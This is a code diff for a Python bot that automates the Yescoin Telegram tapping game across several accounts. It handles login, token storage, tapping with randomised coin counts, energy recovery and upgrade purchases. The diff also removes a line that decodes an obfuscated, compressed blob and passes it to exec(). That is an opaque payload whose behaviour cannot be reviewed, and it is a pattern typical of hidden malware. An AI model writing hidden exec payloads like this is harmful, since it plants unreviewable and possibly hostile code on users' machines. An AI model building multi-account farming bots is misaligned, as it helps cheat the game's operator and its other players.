@@ -1,4 +1,362 @@
+import os
+import sys
+import time
+import json
+import random
+import requests
+from datetime import datetime
+from urllib.parse import unquote, parse_qs
+from base64 import b64decode, urlsafe_b64decode
+from colorama import *
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+init(autoreset=True)
+
+merah = Fore.LIGHTRED_EX
+hijau = Fore.LIGHTGREEN_EX
+kuning = Fore.LIGHTYELLOW_EX
+biru = Fore.LIGHTBLUE_EX
+hitam = Fore.LIGHTBLACK_EX
+reset = Style.RESET_ALL
+putih = Fore.LIGHTWHITE_EX
+line = putih + "~" * 50
+
+banner = """
+ _  ___ _                    
+| |/ (_) |_ __ _ _ __ ___    
+| ' /| | __/ _` | '__/ _ \   
+| . \| | || (_| | | | (_) |  
+|_|\_\_|\__\__,_|_|  \___/   
+"""
+
+class Bot:
+    def __init__(self):
+        self.peer = "theYescoin_bot"
+        self.base_headers = {
+            "accept": "application/json, text/plain, */*",
+            "user-agent": "",
+            "content-type": "application/json",
+            "origin": "https://www.yescoin.gold",
+            "x-requested-with": "org.telegram.messenger",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.yescoin.gold/",
+            "accept-language": "en,en-US;q=0.9",
+        }
+        self.marin_kitagawa = lambda data: {
+            key: value[0] for key, value in parse_qs(data).items()
+        }
+        self.token_file = ".tokens.json"
+
+    def load_config(self):
+        config = json.loads(open("config.json", "r").read())
+        self.interval = int(config["interval"])
+        self.sleep = int(config["sleep"])
+        self.tap_start = int(config["tap_range"]["start"])
+        self.tap_end = int(config["tap_range"]["end"])
+        self.energy_limit = int(config["energy_limit"])
+        self.coinlimit = config["auto_upgrade"]["coinlimit"]
+        self.fillrate = config["auto_upgrade"]["fillrate"]
+        self.multivalue = config["auto_upgrade"]["multivalue"]
+
+    def is_expired(self, token):
+        header, payload, sign = token.split(".")
+        jeload = json.loads(urlsafe_b64decode(payload + "=="))
+        exp = jeload.get("exp")
+        now = int(time.time())
+        if now > exp:
+            return True
+        return False
+
+    def convert(self, data):
+        out = ""
+        key = list(data.keys())
+        for i in key:
+            out += i + "=" + data[i]
+            if i == key[len(key) - 1]:
+                break
+            out += "&"
+        return out
+
+    def main(self):
+        
+        if not os.path.exists(self.token_file):
+            open(self.token_file, "w").write(json.dumps({}))
+        print(banner)
+        print("Telegram - @BhonePyaeThuKitaro")
+        print("Join my group - https://t.me/+yl_GWf4azeNmODA9")
+        self.load_config()
+        while True:
+            datas = [i for i in open("data.txt").read().splitlines() if len(i) > 0]
+            for no, data in enumerate(datas):
+                print(line)
+                self.log(
+                    f"{hijau}account number : {putih}{no + 1}{hijau}/{putih}{len(datas)}"
+                )
+                parser = self.marin_kitagawa(data)
+                _user = parser.get("user")
+                if _user is None:
+                    self.log(f"{merah}something wrong with your data line {no + 1}")
+                    continue
+                user = json.loads(_user)
+                self.id = str(user.get("id"))
+                first_name = user.get("first_name")
+                last_name = user.get("last_name")
+                username = user.get("username")
+
+                self.log(f"{hijau}name : {putih}{first_name} {last_name}")
+                self.log(f"{hijau}username : {putih}{username}")
+                tokens = json.loads(open(self.token_file).read())
+                token = tokens.get(self.id)
+                _data = self.convert(parser)
+                if not token:
+                    token = self.login(_data)
+                if self.is_expired(token):
+                    token = self.login(_data)
+                self.base_headers["token"] = token
+                while True:
+                    self.user_info()
+                    build = self.get_build_info()
+                    if isinstance(build, bool):
+                        print(build)
+                        continue
+
+                    coin = random.randint(self.tap_start, self.tap_end)
+                    energy_used = coin * int(build["multivalue"]["value"])
+                    res_energy = self.get_energy()
+                    if int(energy_used) > int(res_energy):
+                        if build["energy_recovery"] != 0:
+                            recovery_url = (
+                                "https://api.yescoin.gold/game/recoverCoinPool"
+                            )
+                            res = self.http(recovery_url, self.base_headers, "")
+                            if res.json().get("code") != 0:
+                                self.log(f"{merah}recoverty energy failure !")
+                                continue
+                            self.log(f"{hijau}success recovery energy !")
+                            continue
+
+                        if build["box_recovery"] != 0:
+                            self.open_box()
+                            continue
+
+                        res_coin = self.user_info()
+                        build = self.get_build_info()
+                        if isinstance(build, bool):
+                            break
+
+                        if self.multivalue:
+                            if int(res_coin) > int(build["multivalue"]["cost"]):
+                                self.levelup(1, "multivalue")
+                            else:
+                                self.log(
+                                    f"{kuning}coins not enough to upgrade multivalue !"
+                                )
+
+                        if self.coinlimit:
+                            if int(res_coin) > int(build["coinlimit"]["cost"]):
+                                self.levelup(3, "coinlimit")
+                            else:
+                                self.log(
+                                    f"{kuning}coins not enough to upgrade coinlimit !"
+                                )
+
+                        if self.fillrate:
+                            if int(res_coin) > int(build["fillrate"]["cost"]):
+                                self.levelup(2, "fillrate")
+                            else:
+                                self.log(
+                                    f"{kuning}coins not enough to upgrade fillrate !"
+                                )
+                        break
+
+                    self.collect_coin(coin)
+                    self.countdown(self.interval)
+                    continue
+            self.countdown(self.sleep)
+
+    def open_box(self):
+        special_box_url = "https://api.yescoin.gold/game/recoverSpecialBox"
+        special_box_info_url = "https://api.yescoin.gold/game/getSpecialBoxInfo"
+        special_box_collect_url = "https://api.yescoin.gold/game/collectSpecialBoxCoin"
+        res = self.http(special_box_url, self.base_headers, "")
+        code = res.json().get("code")
+        if code != 0:
+            self.log(f"{merah}dont worry,get special box failure")
+            return False
+        res = self.http(special_box_info_url, self.base_headers)
+        code = res.json().get("code")
+        if code != 0:
+            self.log(f"{merah}dont worry, get special box info failure ")
+            return False
+        data = None
+        if res.json()["data"]["autoBox"] is not None:
+            box_type = res.json()["data"]["autoBox"]["boxType"]
+            box_count = res.json()["data"]["autoBox"]["specialBoxTotalCount"]
+            box_status = res.json()["data"]["autoBox"]["boxStatus"]
+            if box_status:
+                coin = random.randint(100, int(box_count))
+                data = {"boxType": box_type, "coinCount": coin}
+        if res.json()["data"]["recoveryBox"] is not None:
+            box_type = res.json()["data"]["recoveryBox"]["boxType"]
+            box_count = res.json()["data"]["recoveryBox"]["specialBoxTotalCount"]
+            box_status = res.json()["data"]["recoveryBox"]["boxStatus"]
+            if box_status:
+                coin = random.randint(100, int(box_count))
+                data = {"boxType": box_type, "coinCount": coin}
+        if data is None:
+            return False
+        self.countdown(30)
+        data = json.dumps(data)
+        res = self.http(special_box_collect_url, self.base_headers, data)
+        code = res.json().get("code")
+        if code != 0:
+            self.log(f"collect coin failure !")
+            return
+        coll_amount = res.json()["data"]["collectAmount"]
+        self.log(f"{hijau}success collect {coll_amount} from special box !")
+        return True
+
+    def levelup(self, data, name=None):
+        url = "https://api.yescoin.gold/build/levelUp"
+        data = json.dumps(data)
+        res = self.http(url, self.base_headers, data)
+        if res.json().get("code") != 0:
+            self.log(f"{merah}upgrade {name} failure !")
+            return False
+
+        self.log(f"{hijau}upgrade {name} successfully !")
+        return True
+
+    def user_info(self):
+        url = "https://api.yescoin.gold/account/getAccountInfo"
+        headers = self.base_headers
+        res = self.http(url, headers)
+        code = res.json().get("code")
+        if code != 0:
+            self.log(f"{merah}something wrong, check http.log !")
+            return False
+
+        coin = res.json()["data"]["currentAmount"]
+        rank = res.json()["data"]["rank"]
+        uid = res.json()["data"]["userId"]
+        level = res.json()["data"]["userLevel"]
+        self.log(f"{hijau}total coin : {putih}{coin}")
+
+        return coin
+
+    def get_energy(self):
+        url = "https://api.yescoin.gold/game/getGameInfo"
+        res = self.http(url, self.base_headers)
+        if res.json().get("code") != 0:
+            self.log(f"{merah}failed fetch get_energy data !")
+            return False
+
+        pool_left = res.json()["data"]["coinPoolLeftCount"]
+        pool_total = res.json()["data"]["coinPoolTotalCount"]
+        self.log(f"{hijau}energy remaining : {putih}{pool_left}/{pool_total}")
+        return pool_left
+
+    def collect_coin(self, data):
+        url = "https://api.yescoin.gold/game/collectCoin"
+        headers = self.base_headers
+        data = json.dumps(data)
+        res = self.http(url, self.base_headers, data)
+        if res.json().get("code") != 0:
+            self.log(f"{merah}failed add {putih}{data} {merah}")
+            return False
+
+        self.log(f"{hijau}success add {putih}{data} {hijau}coins !")
+        return True
+
+    def get_build_info(self):
+        url = "https://api.yescoin.gold/build/getAccountBuildInfo"
+        res = self.http(url, self.base_headers)
+        code = res.json().get("code")
+        if code != 0:
+            self.log(f"{merah}something wrong, check http.log !")
+            return False
+
+        data = {}
+        data["multivalue"] = {}
+        data["multivalue"]["cost"] = res.json()["data"]["singleCoinUpgradeCost"]
+        data["multivalue"]["value"] = res.json()["data"]["singleCoinValue"]
+        data["coinlimit"] = {}
+        data["coinlimit"]["cost"] = res.json()["data"]["coinPoolTotalUpgradeCost"]
+        data["fillrate"] = {}
+        data["fillrate"]["cost"] = res.json()["data"]["coinPoolRecoveryUpgradeCost"]
+        data["box_recovery"] = res.json()["data"]["specialBoxLeftRecoveryCount"]
+        data["energy_recovery"] = res.json()["data"]["coinPoolLeftRecoveryCount"]
+        return data
+
+    def log(self, message):
+        now = datetime.now().isoformat(" ").split(".")[0]
+        print(f"{hitam}[{now}]{putih} {message}{reset}")
+
+    def countdown(self, t):
+        for t in range(t, 0, -1):
+            menit, detik = divmod(t, 60)
+            jam, menit = divmod(menit, 60)
+            jam = str(jam).zfill(2)
+            menit = str(menit).zfill(2)
+            detik = str(detik).zfill(2)
+            print(f"waiting until {jam}:{menit}:{detik} ", flush=True, end="\r")
+            t -= 1
+            time.sleep(1)
+        print("                          ", flush=True, end="\r")
+
+    def save_token(self, id, token):
+        data = json.loads(open(self.token_file).read())
+        data[id] = token
+        open(self.token_file, "w").write(json.dumps(data))
+
+    def login(self, data):
+        login_url = "https://api.yescoin.gold/user/login"
+        if self.base_headers.get("token"):
+            self.base_headers.pop("token")
+
+        data = {"code": data}
+        res = self.http(login_url, self.base_headers, json.dumps(data))
+        if res.status_code != 200:
+            self.log(f"{merah}something wrong,check http.log !")
+            return False
+        code = res.json().get("code")
+        if code is None:
+            self.log(f"{merah}something wrong, check http.log")
+            return False
+        if code != 0:
+            self.log(f"{merah}something wrong, check http.log")
+            return False
+        token = res.json().get("data").get("token")
+        self.save_token(self.id, token)
+        self.log(f"{putih}login {hijau}successfully !")
+        return token
+
+    def http(self, url: str, headers: dict, data=None):
+        while True:
+            try:
+                if data is None:
+                    res = requests.get(url, headers=headers)
+                elif data == "":
+                    res = requests.post(url, headers=headers)
+                else:
+                    res = requests.post(url, headers=headers, data=data)
+
+                open("http.log", "a", encoding="utf-8").write(
+                    f"{res.status_code} {res.text}\n"
+                )
+                return res
+            except (
+                requests.exceptions.ConnectionError,
+                requests.exceptions.Timeout,
+            ):
+                self.log(f"{merah}connection error / connection timeout !")
+                continue
+
+
+if __name__ == "__main__":
+    try:
+        app = Bot()
+        app.main()
+    except KeyboardInterrupt:
+        sys.exit()
